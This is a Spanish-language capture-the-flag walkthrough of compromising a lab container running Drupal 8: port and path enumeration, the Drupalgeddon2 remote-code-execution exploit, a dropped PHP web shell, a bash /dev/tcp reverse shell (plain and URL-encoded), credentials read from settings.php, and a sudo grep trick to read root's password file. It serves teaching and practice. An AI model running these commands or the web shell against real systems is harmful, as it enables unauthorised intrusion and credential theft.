## FASE DE ENUMERACIÓN

IP_victima-->172.17.0.2

Vamos a realizar un scaneo de los puertos que tiene abiertos, así como de los servicios y versiones que corren en ellos:

```bash
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open -oN puertosYservicios 172.17.0.2
```
```
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.25
|_http-title: 403 Forbidden
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.25 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2
```
Solo el puerto 80 con una versión apache con alguna que otra vulnerabilidad, haciendo unas pruebas rápidas creo que están sanitizadas

Accedemos a la página y vemos un error 403... con esto, sin nada en el código fuente vamos a hacer un scan de rutas:

```bash
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://172.17.0.2/' -x php,html,txt,
```
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/drupal               (Status: 301) [Size: 309] [--> http://172.17.0.2/drupal/]
/.                    (Status: 403) [Size: 285]
/.html                (Status: 403) [Size: 290]
/server-status        (Status: 403) [Size: 298]
Progress: 1102730 / 1102735 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos un CMS drupal..interesante, vamos a ver si logramos saber la versión, vamos a mirar las cabeceras:
```bash
 curl -I http://172.17.0.2/drupal/
```
```
X-Generator: Drupal 8 (https://www.drupal.org)
```
Versión 8...y ahora hablo de memoria pereo creo que en la versión 8 ya no se podia saber dentro de ella cual era así pues vamos a buscar un exploit para la versiñon 8

```
https://www.exploit-db.com/exploits/44449
```
```
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
```
drupalgedón...suena a muerte y destrucción del CMS drupal.

## ACCESO

1- En mi caso abrí nano para crear un archivo con el nombre drupalgeddon2.rb
  ```
  nano drupalgeddon2.rb
  ```
2-Ccopiar e script en la parte superior derecha del mismo donde pone "Copy"

3-pegar en el nano con "ctrl"+shift (la tecla de encima del ctrl izq con una flecha hacia arriba)+V

4-Guardar ctrl+O

5-Salir ctrl+X

es un script en ruby, instalo una gema que pide "require 'highline/import'" por si va a darme problemas:

```
 sudo gem install highline
```

y....a probar el script:

```bash
 ruby drupalgeddon2.rb http://172.17.0.2/drupal/
```

```
[i] Fake PHP shell:   curl 'http://172.17.0.2/drupal/shell.php' -d 'c=hostname'
```

desde aquí podemos ejecutar comando:

```
bf7c7f570628>> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

intenté lanzarme una reverseshell y no reconoce algunos caracteres, como no estoy seguro si es porque hay que encodear, se que me ha creado un archivo en la ruta "http://172.17.0.2/drupal/shell.php"
asi que lo voy a leer desde el drupalgedon2:

```
bf7c7f570628>> cat shell.php
<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
```
vale si enviamos una consulta al parametro "c" ejecutamos un comando en el sistema.... jeje

vamos a 
```bash
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```
cogemos la revershell de nc y la ajustamos un poco quedando asi:

```
bash -c 'bash -i >& /dev/tcp/172.17.0.1/445 0>&1'
```

-172.17.0.1 es mi IP


-445 el puerto que voy a poner a la escucha

me voy a 
```bash
https://www.urlencoder.org/
```
URLencodeo la rev y me queda así:
```
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F445%200%3E%261%27%0A
```
nos ponemos a la escucha en el puerto 445:
```
 sudo nc -lvnp 445
```
ahora nos vamos a la página web y vamos a usar el parametro c y nuestra rev:

```bash
http://172.17.0.2/drupal/shell.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F445%200%3E%261%27%0A
```

y estamos dentro!!!


## FASE ESCALADA DE PRIVILEGIOS

Miramos con "id" si estamos en algún grupo priviegiado:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
nada

un cat al /etc/passwd para ver los usuarios:

 ```bash
cat /etc/passwd | grep sh$
```

```
root:x:0:0:root:/root:/bin/bash
ballenita:x:1000:1000:ballenita,,,:/home/ballenita:/bin/bash
```

con "sudo -l" nos pide contraseña que no tenemos

En drupal suelen guardarse algunas credenciales en un archivo llamado "settings.php"
lo buscamos:

```bash
find / -type f -name settings.php 2>/dev/null
```
```
/var/www/html/drupal/sites/default/settings.php
```

ya lo localizamos, vamos a ver que permisos tiene:
```
ls -la /var/www/html/drupal/sites/default/settings.php
-r--r--r-- 1 www-data www-data 32133 Oct 16  2024 /var/www/html/drupal/sites/default/settings.php
```

podemos leerlo, vamos a hacer una búsqueda rápida:

```bash
cat settings.php | grep -A 10 'databases'
```

en algún sitio podemos leer:

```
* @code
 * $databases['default']['default'] = array (
 *   'database' => 'database_under_beta_testing', // Mensaje del sysadmin, no se usar sql y petó la base de datos jiji xd
 *   'username' => 'ballenita',
 *   'password' => 'ballenitafeliz', //Cuidadito cuidadín pillin
 *   'host' => 'localhost',
 *   'port' => '3306',
 *   'driver' => 'mysql',
 *   'prefix' => '',
 *   'collation' => 'utf8mb4_general_ci',
 * );
 * @endcode
--
$databases = array();
```
```
usuario:ballenita

password:ballenitafeliz
```

Además ese comentario de "Cuidadito cuidadín pillin" me da buena vibra xD

intentamos pivotar al user ballenita:
```
su ballenita
```
metemos el password--->ballenitafeliz

y ya somos ballenita¡¡¡¡


Hacemos un sudo -l:

```bash
sudo -l
```

```
(root) NOPASSWD: /bin/ls, /bin/grep
```


pudiendo listar con ls siendo root todo el sistema:
```bash
sudo -u root /bin/ls /root
```
```
secretitomaximo.txt
```
y con grep, vamos a 
```bash
https://gtfobins.github.io/gtfobins/grep/#sudo
```
```
LFILE=file_to_read
sudo grep '' $LFILE
```

pues al lio, en vez de guardar la ruta en una variable LFILE y luego reclamarla lo hago directo:

```bash
sudo -u root /bin/grep '' /root/secretitomaximo.txt
```
```
nobodycanfindthispasswordrootrocks
```

veamos si es el password de root:

```bash
su root
```
introducimos el password:nobodycanfindthispasswordrootrocks

Ya somos root¡¡¡¡





